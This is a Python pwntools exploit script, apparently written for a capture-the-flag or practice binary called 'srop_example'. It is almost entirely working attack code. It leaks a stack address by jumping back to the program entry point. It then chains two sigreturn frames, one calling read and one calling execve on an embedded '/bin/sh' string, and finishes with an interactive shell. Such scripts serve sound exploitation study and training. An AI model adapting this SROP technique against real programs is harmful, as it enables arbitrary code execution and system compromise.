import pwn
import time

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux',
)

target_info = {
	'exec_path': './srop_example',
	'addr_len': 0x8,
	'_start_offset': 0x401000,
	'syscall_ret_offset': 0x40100e,
	'skip_xor_byte': 0x03,
	'sigretreturn_syscall_num': 0xf,
	'stack_addr': 0x0,
	'bin_sh_str_offset': 0x140,
}

'''
goto starting point three time:
	first:  read one byte, set rax = 1 and skip [xor]
	second: write to stdout [rsp+0x0 - rsp+0x400]
	three:  read next payload
'''

def pwn4leak_stack_info4goto():
	payload = pwn.p64(target_info['_start_offset']) * 3
	return payload

def pwn4leak_stack_info4write():
	payload = pwn.p8(target_info['skip_xor_byte'])
	return payload

def pwn4stack_set_by_sigframe():
	sigframe = pwn.SigreturnFrame()
	sigframe.rax = pwn.constants.SYS_read
	sigframe.rdi = 0x0
	sigframe.rsi = target_info['stack_addr']
	sigframe.rdx = 0x400
	sigframe.rcx = 0x0
	sigframe.r8 = 0x0
	sigframe.r9 = 0x0
	sigframe.rsp = target_info['stack_addr']
	sigframe.rip = target_info['syscall_ret_offset']

	payload = pwn.p64(target_info['_start_offset'])
	payload += b'A' * target_info['addr_len']
	payload += bytes(sigframe)
	return payload

def pwn4shell_get_by_sigframe():
	sigframe = pwn.SigreturnFrame()
	sigframe.rax = pwn.constants.SYS_execve
	sigframe.rdi = target_info['stack_addr'] + target_info['bin_sh_str_offset']
	sigframe.rsi = 0x0
	sigframe.rdx = 0x0
	sigframe.rcx = 0x0
	sigframe.r8 = 0x0
	sigframe.r9 = 0x0
	sigframe.rsp = target_info['stack_addr']
	sigframe.rip = target_info['syscall_ret_offset']

	payload = pwn.p64(target_info['_start_offset'])
	payload += b'B' * target_info['addr_len']
	payload += bytes(sigframe)
	payload += b'\x00' * (target_info['bin_sh_str_offset'] - len(payload))
	payload += b'/bin/sh\x00'
	return payload

def pwn4sigreturn_rax_set():
	payload = pwn.p64(target_info['syscall_ret_offset'])
	payload += b'C' * 7
	return payload

'''
stage one   -> leak stack info
stage two   -> set stack address by sigreturn
stage three -> get shell [payload on stack] by sigreturn
'''

print('[--] tips: may need update new offset')
conn = pwn.process(target_info['exec_path'])

payload_1 = pwn4leak_stack_info4goto()
conn.send(payload_1)
time.sleep(1)
payload_2 = pwn4leak_stack_info4write()
conn.send(payload_2)

leak_info = conn.recv()
target_info['stack_addr'] = pwn.u64(leak_info[8:16])
print('[++] reveive: stack address = {0}'.format(hex(target_info['stack_addr'])))

payload_5 = pwn4sigreturn_rax_set()

payload_3 = pwn4stack_set_by_sigframe()
conn.send(payload_3)
time.sleep(1)
conn.send(payload_5)
time.sleep(1)

payload_4 = pwn4shell_get_by_sigframe()
conn.send(payload_4)
time.sleep(1)
conn.send(payload_5)

conn.interactive()
